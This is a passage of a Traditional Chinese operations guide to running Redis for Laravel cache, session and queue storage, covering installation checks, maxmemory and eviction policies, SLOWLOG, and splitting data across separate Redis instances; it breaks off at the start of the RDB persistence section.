---
title: "Redis 快取入門"
desc: "Redis 當快取／session／佇列後端的安裝、maxmemory 與持久化取捨、防挖礦加固與 Laravel 串接"
aliases: [redis, redis-cli, requirepass, maxmemory-policy, RDB, AOF, session store, ACL SETUSER]
tags: [群組/軟體與開發工具, 服務/redis, 主題/快取, 主題/記憶體管理, 安全/未授權存取]
category: 資料庫與資料儲存
difficulty: 進階
status: 完成
distro: [ubuntu, rhel]
prerequisites: ["[[020-01-14-guide-Linux-套件管理]]", "[[020-01-17-cmd-Linux-systemd服務管理]]", "[[020-01-26-guide-Linux-核心模組與sysctl調校]]"]
updated: 2026-08-28
---

# Redis 快取入門

> [!abstract] 這篇你會學到
> - 判斷**你這台 Redis 裡的資料掉了會怎樣** —— cache 掉了只是變慢、session 掉了全站登出、
>   queue 掉了任務永久消失，這一句話決定後面每一個設定
> - 設定 `maxmemory` 與 `maxmemory-policy`，並知道★★★★ **不設 maxmemory 時，
>   吃光記憶體後被 OOM Killer 殺掉的常常不是 Redis，是同一台上的 MySQL**
> - 在 RDB 與 AOF 之間做出可以說明給主管聽的取捨，並知道★★★★★
>   **一次 `systemctl restart redis-server` 就可能是全體使用者登出 + 佇列任務永久消失**
> - ★★★★★ 把 Redis 從「預設安全」守到「人為改壞也不會被挖礦」：`bind`、`protected-mode`、
>   `requirepass`、Redis 6 ACL、防火牆白名單，以及 Docker `-p 6379:6379` 繞過 ufw 這個大坑
> - 看懂 `INFO memory` / `INFO stats` 幾個關鍵欄位，判斷「該加記憶體、該調 TTL、還是該拆 instance」
> - 產出一支 `redis-hardening-check.sh`，把整改前後對照表直接貼進稽核回覆
> - 把 Laravel 的 session / cache / queue 正確接上 Redis，並避開★★★★
>   **沒設 `REDIS_PREFIX`，A 站 `cache:clear` 清光 B 站 session** 這個多站共用的經典事故

## 前置知識

- [[020-01-14-guide-Linux-套件管理]] —— `apt` / `dnf` 安裝與套件版本查詢，本篇不重複
- [[020-01-17-cmd-Linux-systemd服務管理]] —— 本篇會用到 **template unit**（`redis-server@.service`）與 drop-in
- [[020-01-26-guide-Linux-核心模組與sysctl調校]] —— `vm.overcommit_memory`、`net.core.somaxconn` 的機制在那篇，
  本篇只講「Redis 該設什麼值、不設會看到什麼錯誤」
- [[090-02-02-guide-防火牆-ufw基礎與實務]] —— 規則語法在那篇，本篇只講「該放行給誰」
- [[060-01-04-03-guide-ss-netstat-與lsof]] —— 看監聽面與連線數的工具

> [!tip] 這篇不重複的內容（先講清楚邊界，省你時間）
> - **Laravel 應用層的快取 API**（`Cache::remember()`、`Cache::tags()`、`cache:clear` 與
>   `config:cache` 的差別）在 [[130-01-04-04-guide-Laravel-快取最佳化與部署流程]]。
>   本篇只從 Redis 這一側講「那些指令打進來之後，Redis 上發生了什麼」。
> - **佇列與 Horizon**（`queue:work`、Supervisor、失敗重試）在 [[130-01-04-03-guide-Laravel-佇列排程與Supervisor]]。
>   本篇只講兩個伺服器面的後果：**payload 佔記憶體**、**沒開持久化時任務會消失**。
> - **session 與認證流程**（Sanctum／JWT、cookie 設定）在 [[130-01-05-04-guide-認證串接-Sanctum與JWT]]。
>   本篇只講 session 存進 Redis 之後的儲存面問題：被淘汰、被 flush、重啟消失。
> - [[130-01-04-01-guide-Laravel-環境需求與安裝]] 用大約 10 行給了「最小可動版」的 Redis 安裝，
>   ★★★ **這篇是那 10 行背後的正式環境版**。兩篇的值不一致時，以本篇為準。
> - **不寫** Cluster、Sentinel、Streams、Pub/Sub 應用設計、Lua script、向量檢索用途 ——
>   超出「維運手上那台 Redis」的範圍。Cluster 與 Sentinel 只在觀念說明用三行交代
>   「什麼時候才需要往上升級」。

---

## 觀念說明

### 快取真正省掉的是什麼

維運常見的誤解是「Redis 比較快是因為在記憶體」。這句話只對一半。
下面兩條路徑放在一起看，就知道省掉的其實是**一整串工作**：

```text
【沒有快取】每一次請求都走完整條路
瀏覽器 ──> Nginx ──> PHP-FPM worker ──> 開 MySQL 連線 (TCP + 認證)
                          │                   │
                          │                   ├─ 解析 SQL、規劃執行計畫
                          │                   ├─ 讀 InnoDB buffer pool / 磁碟
                          │                   └─ 回傳 result set
                          └──> PHP 把 result set 轉成物件、序列化、算出 HTML
                                                          總耗時 ≈ 30 ~ 300 ms

【有快取，命中】
瀏覽器 ──> Nginx ──> PHP-FPM worker ──> Redis GET laravel_database_...
                          │                   └─ 記憶體查表，O(1)
                          └──> unserialize 一次就好          總耗時 ≈ 0.5 ~ 3 ms
                                                             ↑ 其中網路來回就佔 0.2~0.5 ms

【有快取，沒命中】
瀏覽器 ──> Nginx ──> PHP-FPM ──> Redis（miss）──> MySQL ──> 回寫 Redis ──> 回應
                                          ↑ 比沒快取還慢一點點（多了一次來回）
```

三個要記住的結論：

1. ★★★ **快取省掉的是「查詢規劃 + 磁碟／buffer pool 存取 + 物件化」，不是網路。**
   Redis 跟 MySQL 都在同一個內網，網路來回的成本是一樣的。
   所以**把一個本來就只要 0.3 ms 的簡單主鍵查詢丟去快取，幾乎不會變快**，
   只是多了一份要維護的資料。
2. ★★★ **命中率不到 80% 的快取通常是負資產** —— 每次 miss 都比沒快取多一趟來回，
   還多佔記憶體。命中率怎麼算見〈監控與容量判斷〉。
3. ★★★★ **快取讓你的系統多了一個單點。** 快取掛掉時，全部流量瞬間打到 MySQL，
   這叫 cache stampede（快取雪崩）。「Redis 掛了只是變慢」這句話在高流量時是錯的 ——
   MySQL 會先被打爆。所以 Redis 也要納入監控，不是「附屬品」。

### ★★★★ 三種資料放在同一台 Redis：cache / session / queue

這是全篇的地基。同一台 Redis 上，Laravel 會塞進三種**性質完全相反**的資料：

| 維度 | **cache**（快取） | **session**（登入狀態） | **queue**（佇列任務） |
| --- | --- | --- | --- |
| 掉了會怎樣 | ★ 變慢，DB 壓力上升，**功能正常** | ★★★★ **全站使用者登出**、表單填一半消失 | ★★★★★ **任務永久消失**（寄信沒寄、公文沒送、對帳沒跑） |
| 要不要持久化 | ★ 不用，重啟冷啟動即可 | ★★★★ 要（AOF） | ★★★★★ 一定要（AOF） |
| 要不要設 TTL | ★★★ 一定要，沒 TTL 的快取是記憶體漏水 | ★★ 有（`SESSION_LIFETIME`，預設 120 分鐘） | ★★★★ **不能設**，任務要等到被處理 |
| 可不可以被淘汰 | ★ 可以，這正是它的設計 | ★★★★★ **絕對不行** | ★★★★★ **絕對不行** |
| 適合的 policy | `allkeys-lru` | `noeviction` | `noeviction` |
| 大小可預測嗎 | ★★ 不可預測，會一直長 | ★★ 可預測（人數 × 每人幾 KB） | ★★★ 不可預測，塞車時暴衝 |

> [!danger] ★★★★★ 這張表最右邊兩欄是相反的，卻常被放在同一個 instance
> `allkeys-lru` 的意思是「記憶體滿了就淘汰最久沒用到的 key，**不管它是什麼**」。
> Redis 不知道哪個 key 是 session、哪個是快取 —— 對它來說都只是字串。
>
> 於是實際發生的事情是：某天流量上升、快取塞滿記憶體 →
> Redis 開始淘汰「最久沒被用到的 key」→
> **剛好是那些十分鐘沒動作的使用者的 session** →
> 他們按下一個按鈕就被踢回登入頁，表單內容全沒了。
>
> 而 Nginx、PHP、Laravel 的 log **完全沒有錯誤**，因為對程式來說
> 「session 不存在」跟「使用者本來就沒登入」是同一件事。
> 這是本篇最難查的事故，解法見〈★★★★★ cache 與 session 混在同一個 instance 的災難〉。

### Redis 是單執行緒 —— 這件事的後果

Redis 的指令執行是**單執行緒**的（網路 I/O 在 6.0 之後可以多執行緒，但**指令本身仍然一個一個跑**）。

```text
      ┌──────────────── Redis 主執行緒（一次只做一件事）────────────────┐
      │  GET a  │  SET b  │  ★★★★ KEYS *（掃 200 萬個 key，耗時 4 秒）  │  GET c │
      └─────────┴─────────┴──────────────────────────────────────────┴────────┘
                            ↑ 這 4 秒之內，其他所有連線全部排隊
                              → PHP-FPM 的 worker 一個一個卡住
                              → pm.max_children 用完 → Nginx 回 502
```

所以「一個人在正式機上打了一行 `KEYS *`，整個網站掛四秒」是真的會發生的事。
同樣會阻塞的還有：`FLUSHALL`（同步版）、對百萬元素的 `DEL` / `LRANGE 0 -1`、
`SMEMBERS` 大集合、以及 `bgsave` 時的 fork（fork 本身會短暫停頓）。

★★★★ **正式環境的鐵律：任何 O(N) 而 N 不可控的指令都不准打。** 替代做法在〈維運會用到的 key 操作〉。

### 什麼時候才需要 Cluster / Sentinel

> [!info]- 單機夠不夠用？（Cluster 與 Sentinel 的判斷，本篇不展開）
> - **單機 Redis 的天花板很高**：一台 8 GB / 4 vCPU 的 VM，做 session + cache
>   撐得住每秒數萬次操作。機關的線上申辦系統通常連 1% 都用不到。
> - **需要 Sentinel** 的唯一理由是「Redis 掛掉不能有停機時間」（自動故障移轉）。
>   如果你的 session 掉了只是重新登入、還原時間可以接受十分鐘，就不需要。
> - **需要 Cluster** 的唯一理由是「單機記憶體裝不下」或「單執行緒吞吐量不夠」。
>   在那之前，先分成多個 instance（本篇做的事）就夠了，複雜度低一個數量級。
>
> ★★★ 先做「拆 instance + 好的監控 + 可還原的備份」，不要一開始就上 Cluster ——
> 機關環境裡，Cluster 帶來的維運複雜度造成的停機，通常比它避免的停機還多。

> [!warning] 未實機驗證
> 本篇的 Cluster / Sentinel 敘述僅依官方文件與一般實務判斷撰寫，**未在實機驗證**。
> 本篇其餘內容（單機安裝、多 instance、加固、Laravel 串接）以 Ubuntu 24.04 +
> Redis 7.0.x 為基準撰寫，實作前仍請用 `redis-server --version` 對照你手上的版本。

### ★★ 版本與授權：動筆前先確認你裝到的是什麼

| 環境 | 套件來源 | 版本（撰寫時） | 備註 |
| --- | --- | --- | --- |
| Ubuntu 22.04 LTS | `apt` universe | **6.0.16** | ★★★★ 沒有 Redis 7 的 `enable-protected-configs` 保護，見安全段 |
| Ubuntu 24.04 LTS | `apt` universe | **7.0.15** | 本篇主線 |
| Debian trixie / sid | `apt` | 8.x | 8.0 起加回 AGPLv3 授權選項 |
| RHEL 9 / Rocky 9 | AppStream `redis` | 6.2.x（module stream 可換） | 服務名與路徑不同，見對照 callout |

★★★ Redis 7.4 起上游改為 RSALv2/SSPL 雙授權、8.0 起另外提供 AGPLv3，
部分發行版（含 Fedora 與部分 RHEL 衍生版）改預設 **Valkey**（Redis 7.2 的社群 fork）。
**機關採購或資安盤點時會被問到授權**，動工前用下面兩行確認實際狀況：

```bash
redis-server --version
apt policy redis-server 2>/dev/null | head -3
```

預期輸出（Ubuntu 24.04）：

```text
Redis server v=7.0.15 sha=00000000:0 malloc=jemalloc bits=64 build=xxxxxxxxxxxxx
redis-server:
  已安裝：5:7.0.15-1ubuntu0.24.04.3     # ★ epoch 5: 是 Debian 打包慣例，不是版本號
  候選： 5:7.0.15-1ubuntu0.24.04.3
```

★★ Valkey 的設定項與指令幾乎完全相容（它是 fork），本篇內容大致可直接套用，
但 `redis-cli` 換成 `valkey-cli`、服務名換成 `valkey`。

---

## 環境準備與安裝

### 安裝（Ubuntu / Debian 主線）

```bash
sudo apt update
sudo apt install -y redis-server
```

裝完之後服務會自動啟動。**第一件事不是測 ping，是看它聽在哪裡**：

```bash
sudo ss -lntp | grep 6379
```

**安全**的預期輸出（原廠設定就是這樣）：

```text
LISTEN 0  511  127.0.0.1:6379  0.0.0.0:*  users:(("redis-server",pid=1421,fd=6))
LISTEN 0  511      [::1]:6379     [::]:*  users:(("redis-server",pid=1421,fd=6))
```

★★★★★ **危險**的輸出（代表有人改過設定，或你用了非官方安裝方式）：

```text
LISTEN 0  511    0.0.0.0:6379  0.0.0.0:*  users:(("redis-server",pid=1421,fd=6))
                 ↑ 所有介面。如果這台有對外 IP，你現在正在被掃描
```

看到 `0.0.0.0:6379` 就**立刻**跳到〈安全性注意事項〉，先把服務停掉再繼續。

### 確認服務、版本與路徑

```bash
systemctl status redis-server
```

預期輸出（只看關鍵幾行）：

```text
● redis-server.service - Advanced key-value store
     Loaded: loaded (/usr/lib/systemd/system/redis-server.service; enabled; preset: enabled)
     Active: active (running) since Fri 2026-08-28 09:12:03 CST; 2min ago   # ★★★ 看這行
   Main PID: 1421 (redis-server)
     Status: "Ready to accept connections"      # ★★★ 這行才代表真的可以服務了
      Tasks: 5 (limit: 9451)
     Memory: 8.4M
```

```bash
redis-cli ping
```

```text
PONG
```

★★ `PONG` 只證明「本機連得上」。它**不**證明有設密碼、**不**證明有設記憶體上限。

用 `INFO server` 確認三個維運最需要知道的值：

```bash
redis-cli INFO server | grep -E 'redis_version|config_file|executable|process_id'
```

預期輸出：

```text
redis_version:7.0.15
process_id:1421
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf        # ★★★★ 改設定要改這個檔，不要憑印象
```

> [!tip] ★★★★ `config_file` 是唯一可信的設定檔位置
> 教學文章、舊筆記、同事的口頭說明都可能是錯的（尤其在有多個 instance 的機器上）。
> **每次改設定前先跑這一行**，你會少掉一半「改了沒生效」的排錯時間。

Ubuntu / Debian 的關鍵路徑：

| 用途 | 路徑 | 備註 |
| --- | --- | --- |
| 設定檔 | `/etc/redis/redis.conf` | ★★★★ 權限應為 `640 redis:redis`（裡面有明文密碼） |
| 資料目錄 | `/var/lib/redis` | RDB (`dump.rdb`) 與 AOF (`appendonlydir/`) 都在這 |
| 日誌 | `/var/log/redis/redis-server.log` | 送集中日誌的做法見 [[020-01-19-guide-Linux-日誌系統]] |
| systemd unit | `/usr/lib/systemd/system/redis-server.service` | ★★★ 不要直接改，用 drop-in |
| 多 instance 樣板 | `/usr/lib/systemd/system/redis-server@.service` | ★★★★ Debian 系有附，實戰範例會用到 |
| 執行身分 | `redis:redis` | ★★★★ **不是 root**，這在安全段很重要 |

> [!info]- Rocky / AlmaLinux（RHEL 系）對照
> ```bash
> sudo dnf install -y redis
> sudo systemctl enable --now redis
> redis-cli ping
> ```
>
> 差異對照：
>
> | 項目 | Ubuntu / Debian | Rocky / AlmaLinux |
> | --- | --- | --- |
> | 套件名 | `redis-server` | `redis` |
> | **服務名** | `redis-server` | ★★★ **`redis`**（少一截，腳本最常在這裡爆） |
> | 設定檔 | `/etc/redis/redis.conf` | RHEL 9：`/etc/redis/redis.conf`；★★★ RHEL 8 舊版：`/etc/redis.conf` |
> | 資料目錄 | `/var/lib/redis` | `/var/lib/redis` |
> | 日誌 | `/var/log/redis/redis-server.log` | `/var/log/redis/redis.log` |
> | 防火牆 | `ufw` | `firewalld`（`firewall-cmd --add-rich-rule`） |
> | 強制存取控制 | AppArmor | ★★★★ **SELinux** —— 改 `dir` 或改 port 需要 `semanage port -a -t redis_port_t -p tcp 6380` |
>
> ★★★★ 腳本要跨兩個發行版時，**先判斷路徑再動手**，不要寫死：
>
> ```bash
> for f in /etc/redis/redis.conf /etc/redis.conf; do
>   [[ -f "$f" ]] && REDIS_CONF="$f" && break
> done
> [[ -n "${REDIS_CONF:-}" ]] || { echo "找不到 redis.conf" >&2; exit 1; }
> ```
>
> ★★★ SELinux 上把 Redis 改到非標準 port（例如實戰範例的 6380）而忘了 `semanage`，
> 症狀是服務起不來、`journalctl` 顯示 `Could not create server TCP listening socket`，
> `ausearch -m avc -ts recent` 才看得到真正原因。

### ★★★ 改設定的兩條路，兩條都要走

Redis 的設定可以在**執行中熱套用**，也可以寫在設定檔。這兩件事**互不相干**：

```bash
# ① 熱套用：立即生效，但重啟就消失
redis-cli CONFIG SET maxmemory 2gb
```

```text
OK
```

```bash
# ② 寫回設定檔：重啟後才生效，但會持久
sudo sed -i 's/^# *maxmemory .*/maxmemory 2gb/' /etc/redis/redis.conf
```

> [!danger] ★★★ 只做一邊 = 埋一顆定時炸彈
> - **只做 ①**：這次事故排除了，三個月後某次 `apt upgrade` 重啟服務，設定打回原形，
>   同一個事故再發生一次 —— 而且沒人記得上次怎麼解的。
> - **只做 ②**：以為改好了，其實要等到下次重啟。稽核當天量出來的值跟你回報的不一樣。
>
> **兩邊都做，然後用 `CONFIG GET` 驗證。** 這是本篇會反覆出現的動作。

Redis 另外提供 `CONFIG REWRITE`，把目前執行中的設定**寫回原設定檔**：

```bash
redis-cli CONFIG REWRITE
```

```text
OK
```

★★★ 方便，但**會重排並改寫整個設定檔**，你手寫的註解可能被移到別處。
機關環境建議「手動改檔 + `CONFIG SET`」兩步，設定檔才留得住交接說明。

### 維運會用到的資料結構（不是開發者教學）

你不需要會寫 Redis 程式，但要看得懂手上這台裡面裝了什麼：

| 型別 | Laravel 拿它做什麼 | 維運要注意 |
| --- | --- | --- |
| **String** | cache 值、session 內容 | ★★ 大部分的記憶體都在這裡 |
| **Hash** | 部分套件的設定 / 統計 | ★ 通常很小 |
| **List** | ★★★★ **queue 的任務佇列**（`queues:default`） | 長度 = 積壓任務數，暴衝時吃很多記憶體 |
| **Set** | 佇列的 reserved / 去重 | ★ |
| **ZSet**（Sorted Set） | ★★★ 延遲任務（`queues:default:delayed`）、Horizon 統計 | 有序，取最早到期的任務 |

★★★ **看到 `queues:default` 這個 List 一直變長，就是 worker 沒在跑或處理不過來** ——
處理方式在 [[130-01-04-03-guide-Laravel-佇列排程與Supervisor]]，本篇只負責告訴你「它會吃掉你的 maxmemory」。

### key 的日常操作（附輸入 → 預期輸出）

```bash
# 這台有幾個 key（分 database 統計）
redis-cli INFO keyspace
```

```text
# Keyspace
db0:keys=18342,expires=17990,avg_ttl=3417221      # ★★★ expires 遠小於 keys = 有大量沒 TTL 的 key
db1:keys=2043,expires=2043,avg_ttl=598120
```

```bash
redis-cli DBSIZE                # 目前 database（預設 db0）的 key 數
```

```text
(integer) 18342
```

```bash
# 看某個 key 的型別、剩餘存活秒數、佔多少記憶體
redis-cli TYPE laravel_database_laravel_cache_stats:home
redis-cli TTL  laravel_database_laravel_cache_stats:home
redis-cli MEMORY USAGE laravel_database_laravel_cache_stats:home
```

```text
string
(integer) 3412          # ★ 還有 3412 秒過期
(integer) 4216          # ★ 這個 key 連同 overhead 佔 4216 bytes
```

`TTL` 的三種回傳值要背起來：

| 回傳 | 意義 | 星級 |
| --- | --- | --- |
| 正整數 | 剩餘秒數 | ★ |
| `-1` | ★★★ **key 存在但沒有設過期時間** —— 快取類的 key 出現這個就是記憶體漏水 | ★★★ |
| `-2` | key 不存在（可能已過期或被淘汰） | ★★ |

```bash
redis-cli EXPIRE mykey 600      # 補設 10 分鐘 TTL
redis-cli PERSIST mykey         # ★★★ 移除 TTL，讓它永不過期（很少該用）
```

```text
(integer) 1                     # 1 = 有這個 key 且設定成功；0 = key 不存在
```

### ★★★★ 正式環境絕對不要打 `KEYS *`

```bash
# ★★★★★ 不要在正式機執行這一行
redis-cli KEYS '*'
```

原因在〈Redis 是單執行緒〉那張圖：`KEYS` 是 O(N) 且**會一路掃完整個 keyspace 才回應**。
20 萬個 key 大約阻塞 0.2 秒還能忍，200 萬個 key 就是好幾秒 ——
這段時間所有 PHP-FPM worker 全部卡在 Redis 上，`pm.max_children` 用完，Nginx 開始回 502。

**正確做法**用 `SCAN`（分批、每批很小、不阻塞）：

```bash
# redis-cli 內建 --scan，自動幫你做完整個 cursor 迴圈
redis-cli --scan --pattern 'laravel_database_*session*' | head -20
```

```text
laravel_database_gT8kQ2mZ1pVx9LrN4sWc0BdEfHjKuIoP
laravel_database_a1B2c3D4e5F6g7H8i9J0kLmNoPqRsTuV
...
```

```bash
# 只想知道「有幾個」而不想印出來
redis-cli --scan --pattern 'laravel_database_*' | wc -l
```

```text
18342
```

> [!warning] ★★★ `--scan` 也不是零成本
> 它不阻塞，但仍然要跟正式流量搶單執行緒的時間片。**尖峰時段不要跑全量掃描**，
> 而且 `SCAN` 的結果是「弱一致」的 —— 掃描期間新增／刪除的 key 可能漏掉或重複出現。
> 拿它做統計可以，拿它當「精確清單」不行。

### 找出誰在拖慢 Redis：SLOWLOG

```bash
redis-cli CONFIG GET slowlog-log-slower-than
```

```text
1) "slowlog-log-slower-than"
2) "10000"                    # ★ 單位是【微秒】，10000 = 10 毫秒
```

```bash
redis-cli SLOWLOG GET 10
```

```text
1) 1) (integer) 14                       # 序號
   2) (integer) 1787890123                # ★ Unix timestamp，對得上事故時間
   3) (integer) 4218773                   # ★★★★ 耗時 4218773 微秒 = 4.2 秒！
   4) 1) "KEYS"                           # ★★★★ 元兇：有人打了 KEYS *
      2) "*"
   5) "10.10.20.31:51872"                 # ★★★ 來源 IP，去那台查是誰
   6) ""
```

★★★ 事故當下第一個要看的就是這裡。`SLOWLOG` 存在記憶體、預設只留 128 筆
（`slowlog-max-len`），**重啟就沒了** —— 排錯時先把它抓下來再重啟服務。

```bash
redis-cli SLOWLOG RESET       # 整改完歸零，方便觀察改善效果
```

```text
OK
```

---

## 進階設定與調校

### ★★★★ maxmemory：不設的後果比你想的嚴重

```bash
redis-cli CONFIG GET maxmemory maxmemory-policy
```

**原廠**輸出：

```text
1) "maxmemory"
2) "0"                    # ★★★★ 0 = 不限制
3) "maxmemory-policy"
4) "noeviction"           # ★★★ 預設不淘汰
```

`maxmemory 0` 的意思是「Redis 不會自我約束」。實際會發生的事：

```text
記憶體使用量
   ▲
8GB┤                                          ╭──── OOM Killer 出手
   │                                      ╭───╯     kill -9 挑「分數最高」的行程
6GB┤                            ╭─────────╯         ★★★★ 分數 ≈ 用了多少記憶體
   │                  ╭─────────╯                   → 常常是 MySQL，不是 Redis
4GB┤        ╭─────────╯
   │╭───────╯                                       事後現象：
2GB┼╯                                               「快取問題」變成「資料庫掛掉」
   └────────────────────────────────────────▶ 時間   而 Redis 好端端的還活著
```

> [!danger] ★★★★ OOM Killer 殺的不一定是兇手
> Linux 的 OOM Killer 依 `oom_score` 挑犧牲者，而分數主要看**目前佔用的記憶體**。
> 一台同時跑 MySQL 與 Redis 的機器上，MySQL 的 buffer pool 通常比 Redis 大，
> **於是被殺的是 MySQL**。你在 `dmesg` 看到的是：
>
> ```text
> Out of memory: Killed process 1183 (mysqld) total-vm:9482112kB, ...
> ```
>
> 排錯的人於是去查 MySQL，查了半天查不出原因 —— 因為兇手在隔壁。
> `dmesg -T | grep -i 'killed process'` 是這類事故的關鍵一行。

**容量怎麼估**：

| 情境 | 建議 `maxmemory` | 理由 |
| --- | --- | --- |
| Redis 獨佔的機器、**有開持久化** | ★★★★ 實體記憶體的 **50 ~ 60%** | `bgsave` / AOF 重寫要 **fork**，最壞情況記憶體接近翻倍 |
| Redis 獨佔的機器、**完全不持久化**（純 cache） | 70 ~ 75% | 沒有 fork，但仍要留給 OS page cache 與碎片 |
| 與 MySQL / PHP-FPM 共用機器 | ★★★★ **先算好其他人要多少，剩下的再打七折** | 別讓 Redis 去跟 MySQL 搶 |

以實戰範例那台 8 GB 的機器為例：session instance 2 GB + cache instance 3 GB = 5 GB，
剩 3 GB 給 OS、fork 空間與緩衝，符合 50~60% 的原則。

**設定（兩步都要做）**：

```bash
# ① 熱套用
redis-cli CONFIG SET maxmemory 2gb
redis-cli CONFIG SET maxmemory-policy allkeys-lru

# ② 寫回設定檔
sudo tee -a /etc/redis/redis.conf >/dev/null <<'EOF'

# --- 記憶體上限（2026-08-28 維運組設定）---
maxmemory 2gb
maxmemory-policy allkeys-lru
EOF

# ③ 驗證
redis-cli CONFIG GET maxmemory maxmemory-policy
```

```text
1) "maxmemory"
2) "2147483648"           # ★ Redis 回傳的是 bytes，2gb = 2147483648
3) "maxmemory-policy"
4) "allkeys-lru"
```

### 八種 maxmemory-policy

| policy | 行為 | 適用 | 星級 |
| --- | --- | --- | --- |
| `noeviction` | ★★★★ **不淘汰，寫入直接回錯誤** `OOM command not allowed` | session / queue instance | ★★★★ |
| `allkeys-lru` | 從**所有** key 中淘汰最久沒被存取的 | ★★★★ 純 cache instance 的標準答案 | ★★★★ |
| `allkeys-lfu` | 從所有 key 中淘汰**存取次數最少**的 | 熱點很集中（如首頁）時比 LRU 好 | ★★★ |
| `allkeys-random` | 隨機淘汰 | 幾乎沒有使用場景 | ★ |
| `volatile-lru` | 只從**有設 TTL** 的 key 中淘汰 | ★★★★ 有陷阱，見下方 | ★★★★ |
| `volatile-lfu` | 同上，改用 LFU | 同上的陷阱一樣存在 | ★★★ |
| `volatile-random` | 從有 TTL 的 key 中隨機淘汰 | 極少用 | ★ |
| `volatile-ttl` | 從有 TTL 的 key 中挑**最接近到期**的先淘汰 | 混合資料且 TTL 有意義時 | ★★ |

三個實務判斷，比八個名詞重要：

> [!warning] ★★★★ `volatile-lru` 的陷阱：它可能等同 `noeviction`
> `volatile-*` 系列**只淘汰有設過期時間的 key**。
> 如果你的記憶體是被一堆**沒有 TTL** 的 key（例如 session、queue、
> 或程式忘了設 TTL 的快取）佔滿的，Redis 會找不到任何可淘汰的對象，
> 於是行為退化成 `noeviction` —— **開始拒絕寫入，站台 500**。
>
> 判斷方式：`INFO keyspace` 的 `expires` 遠小於 `keys`，就是這個狀況。
>
> ```bash
> redis-cli INFO keyspace
> ```
> ```text
> db0:keys=182340,expires=1204,avg_ttl=0      # ★★★★ 18 萬個 key 只有 1204 個有 TTL
> ```

> [!note] ★★★ `noeviction` 不是「壞的預設值」
> 它是**誠實的預設值**：Redis 不知道你的資料能不能丟，所以選擇「不丟，跟你說我滿了」。
> 對 session / queue 來說這正是你要的行為 —— 你寧可看到 `OOM` 錯誤跳出來、
> 立刻被告警叫起來加記憶體，也不要它默默把使用者的登入狀態丟掉。
> **會讓你半夜起床的設定，好過會讓你三個月查不出原因的設定。**

### ★★★★★ cache 與 session 混在同一個 instance 的災難

把前面兩段合起來，就是本篇最重要的事故場景：

```text
【錯誤配置】一台 Redis、一個 db、maxmemory 4gb、policy allkeys-lru

  db0 ┌──────────────────────────────────────────────────┐
      │ laravel_database_<sessionid>       ← 使用者登入狀態 │
      │ laravel_database_laravel_cache_*   ← 快取（會一直長）│
      │ laravel_database_queues:default    ← 待處理任務      │
      └──────────────────────────────────────────────────┘
                          │
              記憶體達到 4gb，觸發 allkeys-lru
                          ▼
      Redis：「淘汰最久沒被存取的 key」
      → 十分鐘沒動作的使用者 session 正好是最久沒被存取的
      → ★★★★★ 隨機登出、表單消失、且【所有 log 都沒有錯誤】
      → 更慘的是 queues:default 也可能被淘汰 → 任務永久消失
```

**兩種解法，效果差很多**：

| 解法 | 做法 | 解決了什麼 | 沒解決什麼 |
| --- | --- | --- | --- |
| ① **分 database** | `REDIS_CACHE_DB=1`，session 留 db0 | ★★★ `FLUSHDB` 誤清（清 db1 不會影響 db0） | ★★★★★ **完全沒有解決淘汰問題**：`maxmemory` 是**整個 instance** 共用的，`allkeys-lru` 也是跨 db 挑對象 |
| ② **分 instance** | 兩個 port、兩份設定檔、兩組 `maxmemory` 與 policy | ★★★★★ 淘汰、記憶體上限、持久化策略、重啟影響**完全隔離** | 多一份要監控的服務（可接受） |

> [!danger] ★★★★★ 「我有分 db 了」不是答案
> 這是排錯時最常聽到的誤解。`SELECT 1` 只是換一個 namespace，
> **記憶體池、maxmemory、maxmemory-policy、RDB／AOF 設定、重啟行為全部是共用的**。
> 分 db 解決的是「誤操作清錯資料」，**不解決任何一個記憶體問題**。
>
> 機關正式環境的正確答案是 **②分 instance**，做法在下一段。
> 分 db 只適合開發機或流量很小、且已經設 `noeviction` 的站台。

### 建立第二個 Redis instance（Debian 系 template unit）

Ubuntu / Debian 的 `redis-server` 套件附了 systemd **template unit**，
天生支援多 instance。先確認它存在並看清楚它讀哪個設定檔：

```bash
systemctl cat redis-server@ | head -20
```

預期輸出（★★★ **以你機器上的實際輸出為準**，不同版本的 `ExecStart` 略有差異）：

```text
# /usr/lib/systemd/system/redis-server@.service
[Unit]
Description=Advanced key-value store (%i)
After=network.target

[Service]
Type=notify
ExecStart=/usr/bin/redis-server /etc/redis/redis-%i.conf --supervised systemd --daemonize no
...
User=redis
Group=redis
```

關鍵是 `%i`：啟動 `redis-server@cache` 時，它會去讀 **`/etc/redis/redis-cache.conf`**。

完整建立步驟（以 cache instance、port 6380 為例）：

```bash
# ① 從主設定檔複製一份，保留擁有者與權限
sudo cp -a /etc/redis/redis.conf /etc/redis/redis-cache.conf

# ② 改掉「每個 instance 必須不同」的四個值
sudo sed -i \
  -e 's|^port .*|port 6380|' \
  -e 's|^pidfile .*|pidfile /run/redis-cache/redis-server.pid|' \
  -e 's|^logfile .*|logfile /var/log/redis/redis-cache.log|' \
  -e 's|^dir .*|dir /var/lib/redis-cache|' \
  /etc/redis/redis-cache.conf

# ③ 建資料目錄並給對擁有者（★★★★ 忘記這步 = 服務起不來或 MISCONF）
sudo install -d -o redis -g redis -m 750 /var/lib/redis-cache

# ④ 設定檔權限（裡面會有明文密碼）
sudo chown redis:redis /etc/redis/redis-cache.conf
sudo chmod 640 /etc/redis/redis-cache.conf

# ⑤ 啟動並設為開機自啟
sudo systemctl enable --now redis-server@cache

# ⑥ 驗證
systemctl is-active redis-server@cache
redis-cli -p 6380 ping
```

```text
active
PONG
```

```bash
sudo ss -lntp | grep -E '6379|6380'
```

```text
LISTEN 0 511 127.0.0.1:6379 0.0.0.0:* users:(("redis-server",pid=1421,fd=6))
LISTEN 0 511 127.0.0.1:6380 0.0.0.0:* users:(("redis-server",pid=2033,fd=6))   # ★ 第二台起來了
```

> [!warning] ★★★★ 四個「必須不同」的值，漏掉任何一個都會出事
> `port` / `pidfile` / `logfile` / `dir` ——
> 其中 **`dir` 最致命**：兩個 instance 共用同一個 `dir`，
> 它們會**互相覆寫對方的 `dump.rdb`**，重啟後資料錯亂而且沒有任何警告。
> 如果兩邊都開 AOF，`appendonlydir/` 也會打架。
>
> 驗證方式：`redis-cli -p 6379 CONFIG GET dir` 與 `-p 6380 CONFIG GET dir` **必須不一樣**。

### 持久化 ①：RDB 快照

RDB 是「定時把整個記憶體 dump 成一個檔案」。

```bash
redis-cli CONFIG GET save dbfilename dir
```

```text
1) "save"
2) "3600 1 300 100 60 10000"     # ★ 三組條件，任一滿足就 bgsave
3) "dbfilename"
4) "dump.rdb"
5) "dir"
